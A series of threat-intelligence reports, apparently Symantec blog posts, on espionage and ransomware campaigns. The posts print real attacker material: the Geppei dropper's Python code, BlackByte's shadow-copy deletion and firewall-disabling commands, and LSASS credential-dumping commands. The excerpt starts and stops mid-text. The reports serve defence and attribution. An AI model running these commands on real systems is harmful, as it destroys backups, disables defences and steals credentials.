operation: return xor(x, b\"\\xad\" + x[:-1]) Next, the sample finds the explorer.exe process and uses it to change the token of the current thread. It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists. These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = b'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x77\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x22\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x35\\x91\\x37'realkey = datasample[:0x10]+ b'\\x00' * 0x10 for i in range(0x2000):realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(\"checksum\", raw[-32:].hex())return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware. The same encryption algorithm is used for network communication. The encrypted data structure is as follows: struct encrypted_data {byte[16] IV;byte[N] message_data; // always divisible by 16, padding added as necessarybyte[32] sha256_checksum;} The sample stores configuration and state in the following file: %appdata%/microsoft/protect/windows/DMI%X. DAT(where %X is variable and depends on the parameter with which sample was started). It is also encrypted, but with RC4. This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead. The config file modification date will always be in the year 2011 – the “file last edit” year is changed by the malware to 2011. Network communication In normal mode, the sample will try all the following supported connection modes in this order. In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32). - 1: httpsviaconfigproxy: HTTPS with configured proxy - 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: httpsviaiexproxy: self-explanatory. Use proxy from \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ProxyServer - 4: httpsviafirefoxproxy - get proxy from \\\\Mozilla\\\\Firefox\\\\profiles.ini (one of FF config files) - 5: httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser - 6: httpspreconfig -tryto connect without proxy The network packet is composed of two parts: the header and the payload. Both are encrypted separately. struct network_packet {byte[64] encrypted_header; // see encrypted_data abovebyte[N] encrypted_payload; // see encrypted_data above} The structure of the decrypted header is as follows: struct header {int32 command_id;int16 packet_length;int32 packet_crc32;} The structure of the decrypted payload mostly depends on the command ID. The list of supported commands includes: While we do not see data being exfiltrated in this campaign, Billbug is widely regarded as being an espionage actor, indicating that data theft is the most likely motivation in this campaign. The victims in this campaign – government agencies and a certificate authority – also point to an espionage and data-theft motive. The targeting of the government victims is most likely driven by espionage motivations, with the certificate authority likely targeted in order to steal legitimate digital certificates, as mentioned in the introduction. This is potentially very dangerous, as if Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines. The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well-resourced operator that is capable of carrying out sustained and wide-ranging campaigns. Billbug also appears to be undeterred by the possibility of having this activity attributed to it, with it reusing tools that have been linked to the group in the past.

    "text": "Update November 2, 2022:Updated with new information regarding the link to UNC3524. Symantec, byBroadcom Software, has discovered a previously undocumented dropper that is being used to install a new backdoor and other tools using the novel technique of reading commands from seemingly innocuous Internet Information Services (IIS) logs. The dropper (Trojan. Geppei) is being used by an actor Symantec calls Cranefly to install another piece of hitherto undocumented malware (Trojan. Danfuan) and other tools. The technique of reading commands from IIS logs is not something Symantec researchers have seen being used to date in real-world attacks. Initial analysis appeared to show a link between Cranefly activity and the activity of a group called UNC3524 thatMandiant published a blog about in May 2022. This link was primarily based on the use of the Regeorg webshell, however, as this is publicly available on Github, its use alone is not sufficient to establish a firm link. The first malicious activity Symantec researchers saw on victim machines was the presence of a previously undocumented dropper (Trojan. Geppei). It uses PyInstaller, which converts Python script to an executable file. Geppei reads commands from a legitimate IIS log. IIS logs are meant to record data from IIS, such as web pages and apps. The attackers can send commands to a compromised web server by disguising them as web access requests. IIS logs them as normal but Trojan. Geppei can read them as commands. The commands read by Geppei contain malicious encoded .ashx files. These files are saved to an arbitrary folder determined by the command parameter and they run as backdoors. The strings Wrde, Exco, and Cllo don't normally appear in IIS log files. These appear to be used for malicious HTTP request parsing by Geppei; the presence of these strings prompts the dropper to carry out activity on a machine. The attackers can use a dummy URL or even a non-existent URL to send these commands because IIS logs 404s in the same log file by default. flist = ['Wrde','Exco','Cllo','AppleWEBKit'] print('One Two Three') today = datetime.date.today() list1 = str(today).split('-') filename ='u_ex'+ list1[0][2:] + list1[1] + list1[2] +'.log' path ='C:/inetpub/logs/LogFiles/W3SVC1/'+ filename ifos.path.exists(path): shutil.copy(path,'C:\\\\windows\\\\temp\\\\IIS1.log') fp = open('C:\\\\windows\\\\temp\\\\IIS1.log','r') line = fp.readline()ifline != '': iflen(line.split('Wrde')) == 3: temp1 = line.split('Wrde') iflen(line.split('Exco')) == 3: temp2 = line.split('Exco') iflen(line.split('Cllo')) == 3: os.remove('C:\\\\windows\\\\temp\\\\IIS1.log') If the malicious HTTP request sample contains \"Wrde\" e.g.: The passed string to wrde() is decrypted by Decrpt(). The decrypted string is expected to look like the following: These are the malicious .ashx files, which are saved as: The backdoors that are dropped by this dropper include: When the malicious HTTP request sample contains \"Exco\", e.g.: The passed string to exco() is decrypted by Decrpt() and this decrypted string is an executable command by os.system(). If the malicious HTTP request contains \"Cllo\", function clear() is called. This function drops a hacking tool called sckspy.exe to disable eventlog logging for Service Control Manager. This appears to be another previously undocumented tool. It also appears that the clear() function attempts to remove lines that contain command or malicious .ashx file paths from the IIS log file; however, it does not inspect all lines so this function does not seem to work as intended. text4 ='[malicious base64 encoded exe file]' fw = open('c:\\\\windows\\\\temp\\\\DMI27F127.txt','w') os.system('certutil -decode c:\\\\windows\\\\temp\\\\DMI27F127.txt c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('expand c:\\\\windows\\\\temp\\\\DMI27F127.cab c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('c:\\\\windows\\\\system32\\\\sckspy.exe >c:\\\\windows\\\\temp\\\\DMI27F128.txt') fp = open('c:\\\\windows\\\\temp\\\\DMI27F128.txt','r') ifstr1.find('success') != -1: os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.txt') os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('del c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('del c:\\\\windows\\\\temp\\\\DMI27F128.txt') Dropped malicious .ashx files (i.e. Trojan. Danfuan and Hacktool. Regeorg) are removed in wrde() if it is called with option 'r': temp = info[2].replace('\\\\\\\\', '\\\\') os.system('del ' + temp) name = temp.split('\\\\') flist.remove(name[(-1)][:-1]) Hacktool. Regeorg has been used by multiple advanced persistent threat (APT) groups in the past, but as this code is publicly available on GitHub, its use does not offer sufficient clues for attribution. Symantec was unable to link this activity to any known groups. The use of a novel technique and custom tools, as well as the steps taken to hide traces of this activity on victim machines, indicate that Cranefly is a fairly skilled threat actor. While we do not see data being exfiltrated from victim machines, the tools deployed and efforts taken to conceal this activity indicate that the most likely motivation for this group is intelligence gathering.

    "text": "Symantec’s Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom. Blackbyte) operation has begun using a custom data exfiltration tool during their attacks. The malware (Infostealer. Exbyte) is designed to expedite the theft of data from the victim’s network and upload it to an external server. BlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public attention in February 2022 whenthe U. S. Federal Bureau of Investigation (FBI) issued an alertstating that BlackByte had been used to attack multiple entities in the U. S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one of the most frequently used payloads in ransomware attacks. The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: It then checks for the following anti-virus or sandbox-related files: This routine of checks is quite similar to the routine employed by the BlackByte payload itself,as documented recently by Sophos. Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to %APPDATA%\\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account used are hardcoded into Exbyte. Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021,Symantec discovered Exmatter, an exfiltration tool that was used by the BlackMatter ransomware operation andhas since been used in Noberus attacks. Other examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware. In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities in Microsoft Exchange Servers to gain initial access. Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload. Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save debugging symbols from Microsoft. The command is executed directly from the ransomware: powershell -command \"(New-Object Net. WebClient). DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb', 'CSIDL_SYSTEM_DRIVE\\systemdata\\ntkrnlmp.pdb')\" The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details: binPath = C:\\systemdata\\generalate displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!! BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This functionality in BlackBytehas already been documented by Sophosand it closely resembles the techniques leveraged inthe EDRSandblast tool. BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation: cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB It then makes the following service modifications: sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\\systemdata\\generalate type= kernel sc.exe config RemoteRegistry start= auto sc.exe config Dnscache start= auto sc.exe config SSDPSRV start= auto sc.exe config fdPHost start= auto sc.exe config upnphost start= auto The ransomware then modifies firewall settings to enable linked connections: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\" netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\" cmd.exe /c netsh advfirewall set allprofiles state off Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk: cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del CSIDL_WINDOWS\\rdac.exe /F /Q CSIDL_SYSTEM\\svchost.exe -s 27262842 Following the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks suggests that it may be on the way to becoming one of the dominant ransomware threats.

    "text": "Symantec has observed a likely continuation of the Operation CuckooBees activity, this time targeting organizations in Hong Kong. Operation CuckooBeeswas first documentedin May 2022 by researchers at Cybereason, who said the intelligence-gathering campaign had been operating under the radar since at least 2019, stealing intellectual property and other sensitive data from victims. In the attacks observed by Symantec, the attackers remained active on some networks for more than a year. We saw the Spyder Loader (Trojan. Spyload) malware deployed on victim networks, indicating this activity is likely part of that ongoing campaign. While we did not see the ultimate payload in this campaign, based on the previous activity seen alongside the Spyder Loader malware it seems likely the ultimate goal of this activity was intelligence collection. The Spyder Loader malware wasfirst discussed publicly in a March 2021 blog by SonicWall, with the researchers saying at the time that the malware was “being used for targeted attacks on information storage systems, collecting information about corrupted devices, executing mischievous payloads, coordinating script execution, and C&C server communication.” These initial findings were expanded on substantiallyin a detailed Cybereason investigation published in May 2022, which detailed a long-running campaign that the researchers dubbed Operation CuckooBees. They said that this campaign had been ongoing since at least 2019. The researchers said that the attackers exfiltrated hundreds of gigabytes of information and that they “targeted intellectual property developed by the victims, including sensitive documents, blueprints, diagrams, formulas, and manufacturing-related proprietary data.” They also stole data that could be leveraged for use in future cyber attacks — such as credentials, customer data, and information about network architecture. Among the tools used in that campaign was the Spyder Loader malware, which is what was also observed in the activity seen by Symantec researchers. The loader sample analyzed by Symantec researchers is compiled as a 64-bit PE DLL. It is a modified copy of sqlite3.dll, with the following malicious export added: The sqlite3_prepare_v4 export expects a string as its third argument. Reportedly, whenever an export is executed by rundll32.exe, the third argument of the called export should contain part of the process command-line. When this loader is executed, it extracts the file name from its third argument, and the referred file is expected to contain a sequence of records. Each record has the following structure: At minimum, the malware sample requires records storing blob_ids 1 and 2. The sample also checks for the optional blob_ids 3 and 4. For blob_ids 1 and 2, the content of encrypted_blob is encrypted using the AES algorithm in Ciphertext Feedback (CFB) mode with segment_size of 0x80 bits. The encryption key is based on the name of an affected computer per GetComputerNameW() API: And the initialization vector (IV) is derived from the corresponding record header: Then the sample creates FileMapping with the following parameters: Next, it populates the created FileMapping with: Then it checks the status of service IKEEXT and stops the service, if running. Next, it drops the decrypted content of blob_id 1 as the following file, before starting the service: This is apparently intended to execute the created wlbsctrl.dll file. It is likely that this file acts as a next-stage loader that executes the content of blob_id 2 from the created FileMapping. It is possible that the remaining optional blobs could then be used for follow-up stages and/or configuration data. However, as Symantec researchers did not observe these additional content blobs being executed, this is speculative. As previously mentioned, AES encryption is used where the sample uses the CryptoPP C++ library, but ChaCha20 algorithm encryption is also used to obfuscate one of the strings. The malware also cleans up created artifacts, overwriting the content of the dropped wlbsctrl.dll file before deleting it, for example. These steps are most likely taken in order to prevent the activity being analyzed. Debug strings also indicated that the source code location of the malware was the following: Similarities between this activity and the Spyder Loader activity described by Cybereason include: These various similarities led us to conclude that this sample was also a version of the Spyder Loader malware. We saw various variants of Spyder Loader on victim networks, all displaying largely the same functionality. We saw assorted other malware samples that carried out various other types of activity on victim networks, including a modified SQLite DLL with the malicious exportsqlite3_extension_init,which creates and starts a service named GeneralManintenanceWork for a file named data.dat. We also saw Mimikatz being executed on victim networks, as well as a Trojanized ZLib DLL that had multiple malicious exports, one of which appeared to be waiting for communication from a command-and-control (C&C) server, while the other would load a payload from the provided file name in the command-line. Another sample installs and runs the below component of winpcap as a service: Files with the namesnpf.sysandpacket.dllare then installed. While we do not see the final payload delivered in this campaign, the use of the Spyder Loader malware and crossover with the activity previously identified by SonicWall and Cybereason, combined with the victims seen in this recent activity, make it most likely that the motivation behind this activity is intelligence gathering. The fact that this campaign has been ongoing for several years, with different variants of the Spyder Loader malware deployed in that time, indicates that the actors behind this activity are persistent and focused adversaries, with the ability to carry out stealthy operations on victim networks over a long period of time. Companies that hold valuable intellectual property should ensure that they have taken all reasonable steps to keep their networks protected from this kind of activity.

Along with the above high-value targets, the group also conducted an attack against a hospital in South East Asia. In recent attacks, Budworm leveraged the Log4j vulnerabilities (CVE-2021-44228andCVE-2021-45105) to compromise the Apache Tomcat service on servers in order to install web shells. The attackers used Virtual Private Servers (VPS) hosted on Vultr and Telstra as command-and-control (C&C) servers. Budworm’s main payload continues to be the HyperBro malware family, which is often loaded using a technique known as dynamic-link library (DLL) side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. In recent attacks, Budworm has used the endpoint privilege management software CyberArk Viewfinity to perform side-loading. The binary, which has the default name vf_host.exe, is usually renamed by the attackers in order to masquerade as a more innocuous file. Masqueraded names included securityhealthservice.exe, secu.exe, vfhost.exe, vxhost.exe, vx.exe, and v.exe. In some cases, the HyperBro backdoor was loaded with its own HyperBro loader (file names: peloader.exe, 12.exe). It is designed to load malicious DLLs and encrypt payloads. While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times. Other tools used in recent attacks include: Budworm is known for mounting ambitious attacks against high-value targets. While there were frequent reports of Budworm targeting U. S. organizations six to eight years ago, in more recent years the group’s activity appears to have been largely focused on Asia, the Middle East, and Europe. However this is the second time in recent months, Budworm has been linked to attacks against a U. S-based target. A recent CISA reporton multiple APT groups attacking a defense sector organization mentioned Budworm’s toolset. A resumption of attacks against U. S.-based targets could signal a change in focus for the group. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "The Witchetty espionage group (aka LookingFrog) has been progressively updating its toolset, using new malware in attacks on targets in the Middle East and Africa. Among the new tools being used by the group is a backdoor Trojan (Backdoor. Stegmap) that employs steganography, a rarely seen technique where malicious code is hidden within an image. In attacks between February and September 2022, Witchetty targeted the governments of two Middle Eastern countries and the stock exchange of an African nation. The attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities to install web shells on public-facing servers before stealing credentials, moving laterally across networks, and installing malware on other computers. Witchetty was first documented by ESET in April 2022, who concluded that it was one of three sub-groups of TA410, a broad cyber-espionage operation with some links to the Cicada group (aka APT10). Witchetty’s activity was characterized by the use of two pieces of malware, a first-stage backdoor known as X4 and a second-stage payload known as LookBack. ESET reported that the group had targeted governments, diplomatic missions, charities, and industrial/manufacturing organizations. While the group has continued to use the LookBack backdoor, several new pieces of malware appear to have been added to its toolset. One is Backdoor. Stegmap, which leverages steganography to extract its payload from a bitmap image. Although rarely used by attackers, if successfully executed, steganography can be leveraged to disguise malicious code in seemingly innocuous-looking image files. A DLL loader downloads a bitmap file from a GitHub repository. The file appears to be simply an old Microsoft Windows logo. However, the payload is hidden within the file and is decrypted with an XOR key. Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service. Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server. The payload is a fully featured backdoor capable of executing the following commands: Other new tools used by the attackers include: In one attack against a government agency in the Middle East, the first sign of malicious activity occurred on February 27, 2022 when the attackers exploited the ProxyShell vulnerability to dump the memory of the Local Security Authority Subsystem Service (LSASS) process using the comsvcs.dll file. rundll32.exe CSIDL_SYSTEM\\comsvcs.dll, MiniDump 1036CSIDL_PROFILE\\public\\dm.db full The next day, the attackers tried to dump the LSASS process using PowerShell on a different Exchange Server. powershell -exec bypass $p=Get-Process lsass;$f=New-ObjectIO.

    "text": "Attackers deploying the Noberus (aka BlackCat, ALPHV) ransomware have been using new tactics, tools, and procedures (TTPs) in recent months, making the threat more dangerous than ever. Among some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software. Noberus is widely believed to be a successor payload to the Darkside and BlackMatter ransomware families, which were developed by a group Symantec, byBroadcom Software, tracks as Coreid (aka FIN7, Carbon Spider). Darkside was used in theColonial Pipeline ransomware attack in May 2021. The extreme amount of public and law enforcement attention that attack attracted led Coreid to shut down Darkside and replace it with BlackMatter. Coreid runs a ransomware-as-a-service (RaaS) operation, which means it develops the ransomware but it is deployed by affiliates for a cut of the profits. The ransomware being deployed by different affiliates can sometimes explain the different TTPs and attack chains used in Noberus attacks. Noberus sparked interestwhen it was first seen in November 2021because it was coded in Rust, and this was the first time we had seen a professional ransomware strain used in real-world attacks coded in that programming language. Rust is a notable language as it is cross-platform. Coreid claims that Noberus is capable of encrypting files on Windows, EXSI, Debian, ReadyNAS, and Synology operating systems. Noberus emerged shortly after BlackMatter announced it was being retired. Coreid sets out in the rules of its affiliate program that Noberus cannot be used to attack: When announcing Noberus, Coreid underlined the features that appeared designed to emphasize its superiority to rival ransomware, including that each advert is provided with an entrance through its own unique onion domain; the affiliate program architecturally excludes all possible connections with forums; even if a full-fledged command line shell is obtained, the attacker will not be able to reveal the real IP address of the server, and encrypted negotiation chats that can only be accessed by the intended victim. The ransomware also offered two encryption algorithms (ChaCha20 and AES), as well as four encryption modes - Full, Fast, DotPattern and SmartPattern. Full is the most secure but also the slowest mode. SmartPattern offers encryption of “N” megabytes in percentage increments. By default, it encrypts with a strip of 10 megabytes every 10 percent of the file starting from the header, which would be an optimal mode for attackers in terms of speed and cryptographic strength. Sentinel Labs recently published a report where it referred to this kind of encryption as “intermittent encryption” and mentioned how it had been adopted by certain ransomware operators, including Noberus, Black Basta, and more. The percentage of each ransom that is paid to Noberus affiliates varies depending on the ransom amount. Coreid has continuously updated Noberus since its launch in November 2021 to make its operation more efficient. They will also cull affiliates if they are not bringing in enough money, encouraging them to “contact less professional teams”. In December 2021, the ransomware added a new “Plus” role for affiliates that had brought in more than $1.5 million. It gave access to: Coreid made a major update to Noberus in June 2022, which included: Coreid also made some updates to the locker, by adding new restart logic, and simplifying the Linux encryption process. In a July 2022 update the team added indexing of stolen data - meaning its data leaks websites can be searched by keyword, file type, and more. The continuous updating and refining of Noberus’ operations shows that Coreid is constantly adapting its ransomware operation to ensure it remains as effective as possible. The FBIissued a warning in April 2022 saying that between November 2021 and March 2022 at least 60 organizations worldwide had been compromisedwith the Noberus ransomware - the number of victims now is likely to be many multiples of that. In August 2022, a heavily updated version of the Exmatter (Trojan. Exmatter) data exfiltration tool was observed being used alongside Noberus in ransomware attacks. Exmatterwas discovered by Symantec researchers in November 2021 being used alongside the Blackmatter ransomware. It was designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. Even at the time of its discovery, various variants of the tool were seen, as its developers continued to refine it to optimize its operation and expedite exfiltration of a sufficient volume of high-value data in as short a time as possible. This latest version of Exmatter has reduced the number of file types it attempts to exfiltrate. It will now exfiltrate files with the following extensions only: Other new features include: In addition to this, the malware was extensively rewritten, and even existing features were implemented differently. This was possibly a bid to avoid detection. Whether Exmatter is the creation of Coreid or a skilled affiliate of the group is not clear, but its use alongside two different iterations of Coreid’s ransomware is notable. Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now. At least one affiliate of the Noberus ransomware operation was spotted in late August using information-stealing malware that is designed to steal credentials stored by Veeam backup software. Veeam is capable of storing credentials for a wide range of systems, including domain controllers and cloud services. The credentials are stored to facilitate the backup of these systems. The malware (Infostealer. Eamfo) is designed to connect to the SQL database where Veeam stores credentials, and it steal credentials with the following SQL query: Eamfo will then decrypt and display the credentials. Eamfo appears to have been in existence since at least August 2021 and there is evidence that it has previously been used by attackers using the Yanluowang and LockBit ransomware families. A recent report fromBlackBerry also detailed Eamfo being used alongside a new ransomware strain it dubbed Monti, which appears to be based on the leaked source code of the Conti ransomware. The TTPs used in Monti attacks also closely resemble former Conti attack chains, suggesting those behind Monti may be former affiliates of that group. Conti was developed by a group Symantec tracks as Miner. Stealing credentials from Veeamis a known attack techniquethat can facilitate privilege escalation and lateral movement, providing the attackers with access to more data they can potentially exfiltrate and more machines to encrypt. Noberus attacks involving Eamfo seen by Symantec also utilized GMER, a relatively old rootkit scanner that can be leveraged by ransomware actors to kill processes. GMER usage by ransomware attackers appears to have become more frequent in recent months, and it was also seen in the Monti attack detailed by BlackBerry. There’s no doubt that Coreid is one of the most dangerous and active ransomware developers operating at the moment. The group has been around since 2012, and became well-known for using its Carbanak malware to steal money from organizations worldwide, with the banking, hospitality and retail sectors among its preferred targets. Three members of the group were arrested in 2018, and in 2020 the group changed its tactics and launched its ransomware-as-a-service operation. Its continuous development of its ransomware and its affiliate programs indicates that this sophisticated and well-resourced attacker has little intention of going anywhere anytime soon.

    "text": "Symantec, byBroadcom Software, has gained insight into the current activities of a group we call Webworm. The group has developed customized versions of three older remote access Trojans (RATs), including Trochilus, Gh0st RAT, and 9002 RAT. At least one of the indicators of compromise (IOCs) observed by Symantec was used in an attack against an IT service provider operating in multiple Asian countries, while others appear to be in pre-deployment or testing stages. Symantec’s Webworm has links to a group dubbed Space Pirates, which was previously documented in aMay 2022 report from Positive Technologies. It is likely that the two groups are one and the same. Active since at least 2017, Webworm has been known to target government agencies and enterprises involved in IT services, aerospace, and electric power industries located in Russia, Georgia, Mongolia, and a number of other Asian countries. Previous research on the group’s activity found that it uses custom loaders hidden behind decoy documents and modified backdoors that have been around for quite some time. This corresponds with recent Webworm activity observed by Symantec. Malware used by Webworm includes versions of the following threats: First spotted back in 2015, Trochilus is a RAT implemented in C++ and its source code is available for download on GitHub. The malware has been used in targeted threat operations by multiple groups and has features that can help it evade sandbox analysis and be useful in cyber-espionage operations. The RAT’s features include, but are not limited to, the ability to remotely uninstall a file manager, and the ability to download, upload, and execute files. Trochilus has beenpreviously linkedto malware operations from threat actors also using malware such as PlugX and a variant of the 9002 RAT. The 9002 RAT appears to have been in use since at least 2009 and has historically been used by state-sponsored actors. The malware provides attackers with extensive data exfiltration capabilities. Some variants of 9002 RAT inject into memory and do not write to the disk, something that also applies to the sample analyzed by Symantec. The malware has been used in multiple campaigns by a range of actors, including in a hacking operation targeting several large corporations located in South Korea. The RAT was used to deliver additional malware, including the PlugX RAT, onto compromised machines. It has also been involved inattacks making use of zero-day exploits. While the source code for Gh0st RAT was released online in 2008, the malware has continued to be used by advanced persistent threat (APT) groups. Gh0st RAT first made headlines back in 2009, when acyber-espionage group called GhostNetused it to target diplomatic, political, economic, and military targets around the world. Symantec observed three malware droppers developed by Webworm: Analysis of one of the droppers revealed that it drops the following files: The legitimate executable Logger.exe is used to call the “LoadLibraryA” API in order to load the malicious \"[TEMP]\\logexts.dll\" file. Thelogexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON. EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode. The second stage (\"Logger.dat\") constructs the pathname of the third stage also based on its own running executable, where it combines the directory part with hardcoded \"logexts.dat\". Finally, it reads and executes the third stage. Thelogexts.dat file is obfuscated and includes several User Account Control (UAC) bypasses. It attempts to copy the previously dropped files to the following new locations: Then the file unpacks and executes in memory its backdoor payload, a variant of the Trochilus RAT (e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90). The Trochilus modifications include functionality to load its configuration from a file by checking for any of the following locations (in order of preference): The content of the configuration file is decompressed using the Lempel–Ziv–Welch (LZW) algorithm. Interestingly, one of the locations described above (“C:\\ProgramData\\resmon.resmoncfg”) is mentioned in third-party research detailing previous Space Pirates (Webworm) activity. The malware then injects svchost.exe with the ability to: Further investigation by Symantec found that droppers that share a similar structure to the one used to deploy the version of Trochilus RAT modified by Webworm were also used to deploy two additional modified versions of Gh0st RAT and 9002 RAT. Some code modifications made to the variant of Trochilus RAT were also present in the two additional retooled RATs. The additional RATs included: Changes made by Webworm to this version of 9002 RAT are apparently intended to evade detection. For example, the details of the RAT’s communication protocol, such as encryption, have also been modified by the threat actors. Gh0st RAT (BH_A006) was documented in third-party research detailing previous Webworm (Space Pirates) activity. In that research, the version of Gh0st RAT included features such as layers of obfuscation to bypass security protections and hinder analysis, network service creation, UAC bypassing, and shellcode unpacking and launching in the memory. Some of these features were also present in the version of the RAT being prepared by Webworm. Webworm’s use of customized versions of older, and in some cases open-source, malware, as well as code overlaps with the group known as Space Pirates, suggest that they may be the same threat group. However, the common use of these types of tools and the exchange of tools between groups in this region can obscure the traces of distinct threat groups, which is likely one of the reasons why this approach is adopted, another being cost, as developing sophisticated malware can be expensive in terms of both money and time.

    "text": "A distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal. The current campaign appears to be almost exclusively focused on government or public entities, including: A notable feature of these attacks is that the attackers leverage a wide range of legitimate software packages in order to load their malware payloads using a technique known as DLL side-loading. Usually, the attackers used multiple software packages in a single attack. In many cases, old and outdated versions of software are used, including security software, graphics software, and web browsers. In some cases, legitimate system files from the legacy operating system Windows XP are used. The reason for using outdated versions is that most current versions of the software used would have mitigation against side-loading built-in. DLL side-loading isa well-known techniquethat involves attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application themselves (having installed it themselves in most cases). The legitimate application then loads and executes the payload. Once a malicious DLL is loaded by the attackers, malicious code is executed, which in turn loads a .dat file. This file contains arbitrary shellcode that is used to execute a variety of payloads and associated commands in memory. In some cases, the arbitrary shellcode is encrypted. The attackers also leverage these legitimate software packages to deploy additional tools, which are used to further aid in lateral movement. These tools include credential dumping tools, a number of network scanning tools (NBTScan, TCPing, FastReverseProxy, and FScan), and the Ladon penetration testing framework. Attacks usually unfold in the following manner: In April 2022, the attackers targeted a government-owned organization in the education sector in Asia and managed to stay on its network until July. During the period of the compromise, the attackers accessed computers hosting databases and emails and eventually made their way to the domain controller. The first sign of malicious activity occurred on April 23, when a malicious command was executed via imjpuex.exe (SHA256: fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f). The file imjputyc.exe is a legitimate Windows XP file that was used by the attackers to side-load a malicious DLL file (imjputyc.dll), which in turn was used to load a .dat file (payload - imjputyc.dat). Following this activity, imjputyc.exe was used to launch a network service via svchost.exe, likely created by the malicious payload. Additionally, around the same time, the attackers leveraged Imjpuex.exe to install and execute an eleven-year-old version of Bitdefender Crash Handler (file name: javac.exe, SHA256: 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd). While Crash Handler was used for side-loading in this attack, it is just one of many old versions of applications that have been used by this group in recent months. The same Crash Handler executable was copied to CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe and executed. The attackers then installed and executed ProcDump in order to dump credentials from the Local Security Authority Server Service (LSASS): The attackers then launched several command prompts while reloading Crash Handler. This was likely done in order to install additional tools. Shortly afterwards, a file called calc.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9) appeared on the machine and was executed by the attackers. This was a 